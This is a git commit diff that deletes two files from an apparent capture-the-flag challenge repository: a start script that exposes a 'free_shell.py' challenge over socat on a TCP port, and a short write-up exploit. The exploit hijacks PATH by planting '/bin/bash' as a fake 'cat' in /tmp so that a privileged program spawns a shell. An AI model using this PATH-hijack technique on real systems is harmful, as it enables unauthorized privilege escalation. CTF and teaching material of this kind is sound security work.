e1738693ae0eebd497e17f1a448de46246828d86
wwh0ann1 <vvh00am1@gmail.com>
2025-01-24 01:35:06 +0100

    feat: delete test file

--- system/nc-sample/start.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-while :
-do
-    # 맨 마지막 challenge는 계정명
-    su -c "exec socat TCP-LISTEN:7101,reuseaddr,fork EXEC:'/challenge/free_shell.py,stderr'" - challenge;
-done
--- system/ssh-sample/writeup/WRITEUP.md
+++
@@ -1,7 +0,0 @@
-### Exploit
-```shell
-    echo '/bin/bash' > /tmp/cat
-    chmod 777 /tmp/cat
-
-    export PATH="/tmp"
-```
